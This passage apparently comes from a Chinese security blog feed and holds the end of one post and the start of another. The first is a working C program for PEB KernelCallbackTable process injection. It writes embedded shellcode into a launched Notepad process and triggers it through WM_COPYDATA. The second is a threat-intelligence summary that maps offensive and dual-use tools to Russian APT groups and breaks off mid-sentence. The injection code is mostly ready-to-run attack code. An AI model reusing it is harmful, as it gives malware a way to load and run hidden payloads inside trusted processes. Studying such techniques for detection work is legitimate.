&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00&quot;;SIZE_T shellcodeSize = sizeof( payload ) - 1;SIZE_T bytesRead = 0;int main()&#123;    printf( COLOR_YELLOW_BOLD &quot;[*] Initializing exploit...\n&quot; COLOR_RESET );    EnableDebugPrivilege();    LoadNtQueryInformationProcess();    if ( !NtQueryInformationProcess )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] NtQueryInformationProcess is NULL. Exiting...\n&quot; COLOR_RESET );        return -1;    &#125;    printf( COLOR_YELLOW_BOLD &quot;[*] Starting PEB KernelCallbackTable Injection Exploit...\n\n&quot; COLOR_RESET );    // Step 1: Create a new Notepad process (ensure it is visible to the user)    PROCESS_INFORMATION pi = &#123; 0 &#125;;    STARTUPINFO si = &#123; sizeof( STARTUPINFO ) &#125;;    si.dwFlags = STARTF_USESHOWWINDOW;    si.wShowWindow = SW_SHOW;    printf( COLOR_YELLOW_BOLD &quot;\t[*] Creating new Notepad process...\n&quot; COLOR_RESET );    if ( !CreateProcess(        L&quot;C:\\Windows\\System32\\notepad.exe&quot;,        NULL,        NULL,        NULL,        FALSE,        CREATE_NEW_CONSOLE,        NULL,        NULL,        &amp;si,        &amp;pi    ) )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to create Notepad process. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] Notepad process created successfully. PID: %d\n&quot; COLOR_RESET, pi.dwProcessId );    // Step 2: Wait for the new process to initialize    printf( COLOR_YELLOW_BOLD &quot;\t[*] Waiting for Notepad initialization...\n&quot; COLOR_RESET );    WaitForInputIdle( pi.hProcess, 1000 );    // Step 3: Find the Notepad window handle    HWND hWindow = NULL;    DWORD waitTime = 0;    while ( hWindow == NULL &amp;&amp; waitTime &lt; MAX_WAIT_TIME )    &#123;        hWindow = FindWindow( L&quot;Notepad&quot;, NULL );        if ( !hWindow )        &#123;            Sleep( 500 );  // Wait for 500 ms before retrying            waitTime += 500;        &#125;    &#125;    if ( !hWindow )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to find Notepad window handle after waiting for %d milliseconds.\n&quot; COLOR_RESET, MAX_WAIT_TIME );        TerminateProcess( pi.hProcess, 0 );        CloseHandle( pi.hProcess );        CloseHandle( pi.hThread );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] Window Handle found: 0x%p\n&quot; COLOR_RESET, hWindow );    // Step 4: Get the process ID of the Notepad    DWORD pid;    GetWindowThreadProcessId( hWindow, &amp;pid );    printf( COLOR_GREEN_BOLD &quot;\t[+] Process ID: %d\n&quot; COLOR_RESET, pid );    HANDLE hProcess = OpenProcess(        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,        FALSE,        pid    );    if ( !hProcess )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to open target process. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] Process Handle: 0x%p\n&quot; COLOR_RESET, hProcess );    // -----------------------------------------------------    // Using NtQueryInformationProcess to get PEB    // -----------------------------------------------------    printf( COLOR_YELLOW_BOLD &quot;\t[*] Retrieving PEB Address using NtQueryInformationProcess...\n&quot; COLOR_RESET );    PROCESS_BASIC_INFORMATION pbi;    ULONG returnLength;    NTSTATUS status = NtQueryInformationProcess(        hProcess,        ProcessBasicInformation,        &amp;pbi,        sizeof( pbi ),        &amp;returnLength    );    if ( status != 0 )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to query process information. NTSTATUS: 0x%lx\n&quot; COLOR_RESET, status );        return -1;    &#125;    PVOID PebBaseAddress = pbi.PebBaseAddress;    printf( COLOR_BLUE_BOLD &quot;\t\t[*] PEB Address: 0x%p\n&quot; COLOR_RESET, PebBaseAddress );    // Step 6: Read KernelCallbackTable from the target process&#39;s PEB    PVOID KernelCallbackTable;    SIZE_T bytesRead = 0;    if ( !ReadProcessMemory(        hProcess,        ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ),        &amp;KernelCallbackTable,        sizeof( PVOID ),        &amp;bytesRead    ) )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to read KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_BLUE_BOLD &quot;\t\t[*] KernelCallbackTable Address: 0x%p\n&quot; COLOR_RESET, KernelCallbackTable );    // Step 7: Read KernelCallbackTable structure from the target process    KERNELCALLBACKTABLE CCC;    if ( !ReadProcessMemory(        hProcess,        KernelCallbackTable,        &amp;CCC,        sizeof( CCC ),        &amp;bytesRead    ) )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to read KernelCallbackTable structure. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\n\t[+] KernelCallbackTable read successfully. %zu bytes read.\n&quot; COLOR_RESET, bytesRead );    printf( COLOR_BLUE_BOLD &quot;\t\t[*] Dumping KernelCallbackTable structure:\n&quot; COLOR_RESET );    printf( COLOR_GREEN_BOLD &quot;\t\t\t__fnCOPYDATA: 0x%p\n&quot; COLOR_RESET, ( void* ) CCC.__fnCOPYDATA );    printf( COLOR_GREEN_BOLD &quot;\t\t\t__fnCOPYGLOBALDATA: 0x%p\n&quot; COLOR_RESET, ( void* ) CCC.__fnCOPYGLOBALDATA );    printf( COLOR_GREEN_BOLD &quot;\t\t\t__fnDWORD: 0x%p\n&quot; COLOR_RESET, ( void* ) CCC.__fnDWORD );    // -----------------------------------------------------    // Assembly Method: Using LocatePEB and ResolveKernelCallbackTable    // -----------------------------------------------------    /*    //     printf( COLOR_YELLOW_BOLD &quot;\t[*] Retrieving PEB Address using Assembly...\n&quot; COLOR_RESET );    PVOID PebBaseAddressASM = LocatePEB();    printf( COLOR_BLUE_BOLD &quot;\t\t[*] PEB Address (from ASM): 0x%p\n&quot; COLOR_RESET, PebBaseAddressASM );    printf( COLOR_YELLOW_BOLD &quot;\t[*] Resolving KernelCallbackTable using Assembly...\n&quot; COLOR_RESET );    PVOID KernelCallbackTableASM = ResolveKernelCallbackTable( PebBaseAddressASM );    printf( COLOR_BLUE_BOLD &quot;\t\t[*] KernelCallbackTable Address (from ASM): 0x%p\n&quot; COLOR_RESET, KernelCallbackTableASM );    // Continue using KernelCallbackTableASM as needed    */    // Step 8: Write payload to remote buffer    printf( COLOR_YELLOW_BOLD &quot;\n\t[*] Allocating remote buffer for payload...\n&quot; COLOR_RESET );    LPVOID remotebuf = VirtualAllocEx(        hProcess,        NULL,        shellcodeSize,        MEM_RESERVE | MEM_COMMIT,        PAGE_EXECUTE_READWRITE    );    if ( !remotebuf )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to allocate remote buffer. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    if ( !WriteProcessMemory(        hProcess,        remotebuf,        payload,        shellcodeSize,        NULL    ) )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to write payload to remote buffer. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] Payload written to remote buffer at: 0x%p\n&quot; COLOR_RESET, remotebuf );    // Step 9: Modify __fnCOPYDATA in the KernelCallbackTable    printf( COLOR_YELLOW_BOLD &quot;\t[*] Modifying __fnCOPYDATA to point to payload...\n&quot; COLOR_RESET );    CCC.__fnCOPYDATA = ( ULONG_PTR ) remotebuf;    printf( COLOR_BLUE_BOLD &quot;\t\t[*] __fnCOPYDATA now points to: 0x%p\n&quot; COLOR_RESET, remotebuf );    // Step 10: Clone modified KernelCallbackTable    printf( COLOR_YELLOW_BOLD &quot;\n\t[*] Cloning modified KernelCallbackTable...\n&quot; COLOR_RESET );    LPVOID cloneCCC = VirtualAllocEx(        hProcess,        NULL,        sizeof( CCC ),        MEM_RESERVE | MEM_COMMIT,        PAGE_READWRITE    );    if ( !cloneCCC )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to allocate memory for cloned KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    if ( !WriteProcessMemory(        hProcess,        cloneCCC,        &amp;CCC,        sizeof( CCC ),        NULL    ) )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to write cloned KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] Cloned KernelCallbackTable written at: 0x%p\n&quot; COLOR_RESET, cloneCCC );    // Step 11: Update PEB KernelCallbackTable to cloned KernelCallbackTable    printf( COLOR_YELLOW_BOLD &quot;\t[*] Updating PEB with cloned KernelCallbackTable...\n&quot; COLOR_RESET );    if ( !WriteProcessMemory(        hProcess,        ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ),        &amp;cloneCCC,        sizeof( PVOID ),        &amp;bytesRead    ) )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to update PEB KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] PEB KernelCallbackTable updated successfully!\n&quot; COLOR_RESET );    // Step 12: Ensure Memory Protection for Payload    DWORD oldProtect;    if ( !VirtualProtectEx(        hProcess,        remotebuf,        shellcodeSize,        PAGE_EXECUTE_READ,        &amp;oldProtect    ) )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to change memory protection for payload. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] Memory protection for payload set to PAGE_EXECUTE_READ.\n&quot; COLOR_RESET );    // Step 13: Trigger the payload    printf( COLOR_YELLOW_BOLD &quot;\t[*] Sending message to trigger the payload...\n&quot; COLOR_RESET );    COPYDATASTRUCT cds;    WCHAR msg[] = L&quot;LJX&quot;;    cds.dwData = 1;    cds.cbData = ( lstrlenW( msg ) + 1 ) * sizeof( WCHAR );    cds.lpData = msg;    LRESULT result = SendMessage(        hWindow,        WM_COPYDATA,        ( WPARAM ) hWindow,        ( LPARAM ) &amp;cds    );    if ( result == 0 &amp;&amp; GetLastError() != 0 )    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to send message to trigger payload. Error: %d\n&quot; COLOR_RESET, GetLastError() );        return -1;    &#125;    printf( COLOR_GREEN_BOLD &quot;\t[+] Payload triggered!\n&quot; COLOR_RESET );    // Cleanup    printf( COLOR_YELLOW_BOLD &quot;\t[*] Cleaning up...\n&quot; COLOR_RESET );    VirtualFreeEx( hProcess, remotebuf, 0, MEM_RELEASE );    VirtualFreeEx( hProcess, cloneCCC, 0, MEM_RELEASE );    TerminateProcess( pi.hProcess, 0 );    CloseHandle( hProcess );    CloseHandle( pi.hProcess );    CloseHandle( pi.hThread );    printf( COLOR_GREEN_BOLD &quot;\n[+] YAAAAAAAAAY.\n&quot; COLOR_RESET );    printf( COLOR_GREEN_BOLD &quot;[+] Exploit completed successfully.\n&quot; COLOR_RESET );    return 0;&#125;</code></pre><hr><p>最后，感谢您的阅读！</p>]]></content>
    
    
    
    <tags>
      
      <tag>主机安全</tag>
      
      <tag>进程注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>俄罗斯APT组织技战术情报</title>
    <link href="/2024/11/05/%E4%BF%84%E7%BD%97%E6%96%AFAPT%E7%BB%84%E7%BB%87%E6%8A%80%E6%88%98%E6%9C%AF%E6%83%85%E6%8A%A5/"/>
    <url>/2024/11/05/%E4%BF%84%E7%BD%97%E6%96%AFAPT%E7%BB%84%E7%BB%87%E6%8A%80%E6%88%98%E6%9C%AF%E6%83%85%E6%8A%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>Russian GRU: 主要情报局（俄罗斯军队）</li><li>Russian SVR: 俄罗斯联邦外国情报局</li><li>Russian FSB: 俄罗斯联邦安全局</li></ul><h1 id="技战术"><a href="#技战术" class="headerlink" title="技战术"></a>技战术</h1><h2 id="远程监控和管理（RMM）工具"><a href="#远程监控和管理（RMM）工具" class="headerlink" title="远程监控和管理（RMM）工具"></a>远程监控和管理（RMM）工具</h2><p> 提示</p><ul><li>RMM（远程监控和管理）工具是 IT 专业人员和托管服务提供商 （MSP） 用来远程监控、管理和维护 IT 系统、网络和设备的一种软件。</li><li>这些工具旨在提高 IT 运营效率，使技术人员能够从集中位置处理任务，而无需对客户端设备进行物理访问。</li></ul><p>通过合法的 RMM 渠道进行操作，攻击者可以通过混入常规 IT 活动来逃避检测，并且由于这些工具提供的特权提升，可能会绕过安全措施。</p><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>InnoSetup</td><td>UAC-0020</td></tr><tr><td>IntelliAdmin</td><td>Turla</td></tr><tr><td>RemCom</td><td>Sandworm</td></tr><tr><td>Remote Manipulator System (RMS)</td><td>Gamaredon</td></tr><tr><td>RemoteUtilities</td><td>UAC-0050</td></tr><tr><td>SyncThing</td><td>UAC-0020</td></tr><tr><td>TeamViewer</td><td>BERSERK BEAR</td></tr><tr><td>UltraVNC</td><td>Gamaredon</td></tr></tbody></table><h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><p> 提示</p><p>文件同步和管理工具旨在促进跨各种平台和云存储服务高效传输、备份和同步文件。</p><p> 重要</p><ul><li>这些工具可能被滥用，将被盗数据上传到攻击者控制的云帐户或目标服务器。</li><li>通过利用加密数据传输，攻击者可以向网络监控系统隐藏他们的活动，将恶意行为与合法操作混合在一起。</li><li>这些工具的合法性通常会阻止安全系统立即检测到。</li></ul><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>4Shared</td><td>Turla</td></tr><tr><td>Dropbox</td><td>COZY BEAR, Turla</td></tr><tr><td>Firebase</td><td>COZY BEAR</td></tr><tr><td>Gmail</td><td>Turla</td></tr><tr><td>GMX</td><td>Turla</td></tr><tr><td>Google Drive</td><td>COZY BEAR</td></tr><tr><td>Notion</td><td>COZY BEAR</td></tr><tr><td>MEGA</td><td>EMBER BEAR</td></tr><tr><td>OneDrive</td><td>COZY BEAR, Turla</td></tr><tr><td>Telegram</td><td>Gamaredon</td></tr><tr><td>Trello</td><td>COZY BEAR</td></tr><tr><td>Rclone</td><td>EMBER BEAR, Gamaredon</td></tr><tr><td>VFEmail</td><td>Turla</td></tr></tbody></table><h2 id="凭证盗窃工具"><a href="#凭证盗窃工具" class="headerlink" title="凭证盗窃工具"></a>凭证盗窃工具</h2><p>提示</p><ul><li>有许多免费的密码恢复工具可用，旨在帮助用户恢复存储在自己的系统中丢失或忘记的密码。</li><li>这些工具可以提取保存在网络浏览器、电子邮件客户端和其他应用程序中的密码。</li><li>IT 专业人员可以使用这些工具来恢复系统维护或故障排除所需的凭据。</li></ul><p>重要的</p><p>如果攻击者在未经所有者许可的情况下在计算机上运行这些工具，则它们可能会被非法利用获取密码，从而导致未经授权访问敏感信息。</p><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>CookieEditor</td><td>COZY BEAR</td></tr><tr><td>Mimikatz</td><td>COZY BEAR, FANCY BEAR, BERSERK BEAR, Gamaredon, Turla</td></tr><tr><td>ProcDump</td><td>BERSERK BEAR</td></tr><tr><td>SharpChromium</td><td>COZY BEAR</td></tr></tbody></table><h2 id="防御规避工具"><a href="#防御规避工具" class="headerlink" title="防御规避工具"></a>防御规避工具</h2><p>提示</p><ul><li>各种免费的恶意软件检测工具专门用于识别和删除像 rootkit 这样的隐秘威胁。</li><li>它们提供扫描隐藏进程、文件和驱动程序、分析系统内存中的恶意模块以及监控系统挂钩以查找未经授权的修改等功能。</li><li>这些工具提供了对系统内部的详细了解，有助于发现标准防病毒程序可能错过的深层嵌入的恶意软件。</li></ul><p>重要的</p><ul><li>恶意行为者可以滥用这些 rootkit 检测工具来干扰安全工具、篡改文件和注册表以破坏工具功能以及破坏内存以阻止检测。</li><li>通过使用这些工具进行权限提升，对手可以禁用或改变安全软件的运行，从而消除系统用于检测或预防威胁的方法。</li></ul><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>EDRSandBlast</td><td>COZY BEAR</td></tr><tr><td>libprocesshider</td><td>Sandworm</td></tr><tr><td>PowerShellRunner</td><td>Turla</td></tr><tr><td>SDelete</td><td>Sandworm</td></tr><tr><td>VirtualBox Driver</td><td>Turla</td></tr></tbody></table><h2 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h2><p>提示</p><ul><li>网上有许多网络隧道工具可用于管理和与不同环境中的系统交互。</li><li>它们允许用户通过可以绕过网络限制和防火墙的加密通道安全地连接到远程服务器或服务。</li><li>这些工具还可以将本地开发服务器暴露到互联网上以进行测试和共享。</li><li>它们广泛用于远程管理和开发工作流程等任务，为网络管理提供灵活性。</li></ul><p>重要的</p><ul><li>网络犯罪分子可以利用网络隧道工具创建加密隧道、逃避检测并访问受限网络。</li><li>这些工具本质上为对手提供了指挥和控制的便利，帮助他们站稳脚跟并策划进一步的恶意活动。</li></ul><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>Chisel</td><td>Sandworm</td></tr><tr><td>Cloudflared</td><td>Gamaredon</td></tr><tr><td>dnscat2</td><td>EMBER BEAR</td></tr><tr><td>Dropbear</td><td>COZY BEAR</td></tr><tr><td>FortiClient</td><td>BERSERK BEAR</td></tr><tr><td>GOST</td><td>EMBER BEAR</td></tr><tr><td>Iodine</td><td>EMBER BEAR</td></tr><tr><td>Ngrok</td><td>Gamaredon</td></tr><tr><td>OpenSSH</td><td>FANCY BEAR</td></tr><tr><td>Pivotnacci</td><td>Sandworm</td></tr><tr><td>ProxyChains</td><td>EMBER BEAR</td></tr><tr><td>ReGeorg</td><td>COZY BEAR, FANCY BEAR, EMBER BEAR, Sandworm</td></tr><tr><td>Rsockstun</td><td>COZY BEAR</td></tr><tr><td>SSHDoor</td><td>FANCY BEAR</td></tr></tbody></table><h2 id="发现和爆破工具"><a href="#发现和爆破工具" class="headerlink" title="发现和爆破工具"></a>发现和爆破工具</h2><p>提示</p><ul><li>网上有许多网络扫描和分析工具，旨在帮助管理员和 IT 专业人员完成诸如发现和映射网络设备、执行 IP 地址和开放端口的详细扫描以及查询 Active Directory 等网络服务等任务。</li></ul><p>重要的</p><ul><li>恶意对手利用这些网络管理工具进行侦察并收集有关目标网络的详细信息。</li><li>他们可以使用这些工具来识别活动设备、开放端口和漏洞，然后利用这些漏洞来获取访问权限。</li><li>此外，查询活动目录服务的工具可以让他们收集有关用户、群组和权限的敏感信息，从而发起有针对性的攻击或内部威胁。</li><li>本质上，这些工具虽然对于合法的网络管理很有价值，但却可能被滥用来规划和利用网络基础设施来达到邪恶的目的。</li></ul><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>Acunetix</td><td>EMBER BEAR</td></tr><tr><td>Amass</td><td>EMBER BEAR</td></tr><tr><td>AADInternals</td><td>COZY BEAR</td></tr><tr><td>AdFind</td><td>COZY BEAR</td></tr><tr><td>Adminer</td><td>EMBER BEAR</td></tr><tr><td>Angry IP Scanner</td><td>BERSERK BEAR</td></tr><tr><td>Bloodhound</td><td>COZY BEAR, EMBER BEAR</td></tr><tr><td>Droopescan</td><td>EMBER BEAR</td></tr><tr><td>DSInternals</td><td>COZY BEAR</td></tr><tr><td>JoomScan</td><td>EMBER BEAR</td></tr><tr><td>LdapDomainDump</td><td>EMBER BEAR</td></tr><tr><td>NBTScan</td><td>Turla</td></tr><tr><td>Nmap</td><td>EMBER BEAR</td></tr><tr><td>Masscan</td><td>EMBER BEAR</td></tr><tr><td>RoadTools</td><td>COZY BEAR</td></tr><tr><td>SScan</td><td>Turla</td></tr><tr><td>WPScan</td><td>EMBER BEAR</td></tr></tbody></table><h2 id="CC工具"><a href="#CC工具" class="headerlink" title="CC工具"></a>CC工具</h2><p>提示</p><ul><li>攻击性安全工具由专业的道德黑客开发，用于模拟网络攻击并评估组织的防御能力。</li><li>这些工具为后开发活动提供了强大的功能，例如隐秘通信、横向移动以及高级指挥和控制功能。</li><li>一些工具专注于绕过现代安全防御的规避技术，从而实现真实的威胁模拟和有效载荷开发。</li></ul><p>重要的</p><ul><li>网络犯罪分子可以通过各种方式获取攻击性安全工具，通常利用合法渠道或采取非法手段来获取。</li><li>这些工具还允许攻击者自动执行部分攻击，从而使攻击更加高效、范围更加广泛。</li></ul><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>Brute Ratel C4</td><td>COZY BEAR</td></tr><tr><td>Cobalt Strike</td><td>COZY BEAR, Sandworm</td></tr><tr><td>CrackMapExec</td><td>EMBER BEAR, BERSERK BEAR</td></tr><tr><td>Empyre</td><td>FANCY BEAR, Sandworm</td></tr><tr><td>EvilGinx</td><td>COLDRIVER</td></tr><tr><td>Evil-WinRM</td><td>Turla</td></tr><tr><td>Hydra</td><td>BERSERK BEAR</td></tr><tr><td>Impacket</td><td>COZY BEAR, FANCY BEAR, EMBER BEAR, Sandworm, BERSERK BEAR</td></tr><tr><td>JuicyPotatoNG</td><td>Sandworm</td></tr><tr><td>Koadic</td><td>FANCY BEAR</td></tr><tr><td>LinPEAS</td><td>EMBER BEAR</td></tr><tr><td>NetCat</td><td>EMBER BEAR</td></tr><tr><td>Nishang</td><td>FANCY BEAR</td></tr><tr><td>Metasploit</td><td>FANCY BEAR, EMBER BEAR, Sandworm, Turla</td></tr><tr><td>Meterpreter</td><td>EMBER BEAR, Sandworm</td></tr><tr><td>PAS Web Shell</td><td>EMBER BEAR, Sandworm</td></tr><tr><td>Phishery</td><td>BERSERK BEAR</td></tr><tr><td>PoshC2</td><td>Sandworm</td></tr><tr><td>PowerSploit</td><td>COZY BEAR, Turla</td></tr><tr><td>PowerShell Empire</td><td>FANCY BEAR, Sandworm, Turla</td></tr><tr><td>Responder</td><td>FANCY BEAR, EMBER BEAR</td></tr><tr><td>RottenPotatoNG</td><td>Sandworm</td></tr><tr><td>Rubeus</td><td>COZY BEAR</td></tr><tr><td>Sliver</td><td>COZY BEAR</td></tr><tr><td>Weevely Web Shell</td><td>Sandworm</td></tr><tr><td>WinPEAS</td><td>COZY BEAR</td></tr><tr><td>WSO Web Shell</td><td>EMBER BEAR, Sandworm</td></tr></tbody></table><h2 id="持久化文件"><a href="#持久化文件" class="headerlink" title="持久化文件"></a>持久化文件</h2><p>提示</p><ul><li>Windows 环境配备了各种各样的命令行实用程序。</li><li>这些工具共同为高效的系统管理、故障排除和优化提供了强大的支持，帮助管理员维护安全、稳定和高性能的 Windows 环境。</li></ul><p>重要的</p><ul><li>网络犯罪分子经常利用合法的 Windows 管理工具执行恶意操作，同时逃避检测。</li><li>这些工具用于远程执行、文件传输和系统管理等任务，允许攻击者在网络中横向移动、下载和执行恶意软件、操纵日志并收集敏感信息。</li><li>通过利用这些内置实用程序，攻击者可以秘密地开展活动，将他们的行为与正常的管理操作混合在一起。</li></ul><table><thead><tr><th>Tool Name</th><th>Threat Group Usage</th></tr></thead><tbody><tr><td>BITSAdmin</td><td>BERSERK BEAR</td></tr><tr><td>MiniDump</td><td>FANCY BEAR</td></tr><tr><td>PsExec</td><td>COZY BEAR, EMBER BEAR, BERSERK BEAR, Gamaredon, Turla</td></tr><tr><td>Windows Event Utility (wevtutil)</td><td>FANCY BEAR</td></tr><tr><td>WMIC</td><td>COZY BEAR</td></tr></tbody></table><h1 id="总TTPs"><a href="#总TTPs" class="headerlink" title="总TTPs"></a>总TTPs</h1><table><thead><tr><th>Discovery</th><th>RMM Tools</th><th>Defense Evasion</th><th>Credential Theft</th><th>OffSec</th><th>Networking</th><th>LOLBAS</th><th>Exfiltration</th></tr></thead><tbody><tr><td>Acunetix</td><td>InnoSetup</td><td>EDRSandBlast</td><td>CookieEditor</td><td>Brute Ratel C4</td><td>Chisel</td><td>BITSAdmin</td><td>4Shared</td></tr><tr><td>Amass</td><td>IntelliAdmin</td><td>libprocesshider</td><td>Mimikatz</td><td>Cobalt Strike</td><td>dnscat2</td><td>MiniDump</td><td>Dropbox</td></tr><tr><td>AADInternals</td><td>RemCom</td><td>PowerShellRunner</td><td>ProcDump</td><td>CrackMapExec</td><td>Dropbear</td><td>PsExec</td><td>Firebase</td></tr><tr><td>AdFind</td><td>Remote Manipulator System (RMS)</td><td>SDelete</td><td>SharpChromium</td><td>Empyre</td><td>FortiClient</td><td>Windows Event Utility (wevtutil)</td><td>Gmail</td></tr><tr><td>Adminer</td><td>RemoteUtilities</td><td>VirtualBox Driver</td><td></td><td>EvilGinx</td><td>GOST</td><td>WMIC</td><td>GMX</td></tr><tr><td>Angry IP Scanner</td><td>SyncThing</td><td></td><td></td><td>Evil-WinRM</td><td>Iodine</td><td></td><td>Google Drive</td></tr><tr><td>Bloodhound</td><td>TeamViewer</td><td></td><td></td><td>Hydra</td><td>OpenSSH</td><td></td><td>Notion</td></tr><tr><td>Droopescan</td><td>UltraVNC</td><td></td><td></td><td>Impacket</td><td>Pivotnacci</td><td></td><td>MEGA</td></tr><tr><td>DSInternals</td><td></td><td></td><td></td><td>JuicyPotatoNG</td><td>ProxyChains</td><td></td><td>OneDrive</td></tr><tr><td>JoomScan</td><td></td><td></td><td></td><td>Koadic</td><td>ReGeorg</td><td></td><td>Trello</td></tr><tr><td>LdapDomainDump</td><td></td><td></td><td></td><td>LinPEAS</td><td>Rsockstun</td><td></td><td>Rclone</td></tr><tr><td>NBTScan</td><td></td><td></td><td></td><td>NetCat</td><td>SSHDoor</td><td></td><td>VFEmail</td></tr><tr><td>Nmap</td><td></td><td></td><td></td><td>Nishang</td><td></td><td></td><td></td></tr><tr><td>Masscan</td><td></td><td></td><td></td><td>Metasploit</td><td></td><td></td><td></td></tr><tr><td>RoadTools</td><td></td><td></td><td></td><td>Meterpreter</td><td></td><td></td><td></td></tr><tr><td>SScan</td><td></td><td></td><td></td><td>PAS Web Shell</td><td></td><td></td><td></td></tr><tr><td>WPScan</td><td></td><td></td><td></td><td>Phishery</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>PoshC2</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>PowerSploit</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>PowerShell Empire</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>Responder</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>RottenPotatoNG</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>Rubeus</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>Sliver</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>Weevely Web Shell</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>WinPEAS</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>WSO Web Shell</td><td></td><td></td><td></td></tr></tbody></table><h1 id="一些发现"><a href="#一些发现" class="headerlink" title="一些发现"></a>一些发现</h1><p>在最近的威胁分析中，观察到不同的俄罗斯威胁组织对公共可用资源的显著依赖，尤其是在入侵活动中使用各种攻击性安全工具（OST）。以下是一些主要发现：</p><ol><li><strong>使用扫描仪的主要对手</strong>：隶属于 GRU 的 EMBER BEAR 组织在使用扫描仪方面最为活跃。</li><li><strong>其他 GRU 威胁组</strong>：如 FANCY BEAR 和 Sandworm，通常依赖多种攻击性安全工具来支持其入侵活动。</li><li><strong>SVR 组织的多样化工具使用</strong>：隶属于 SVR 的 COZY BEAR 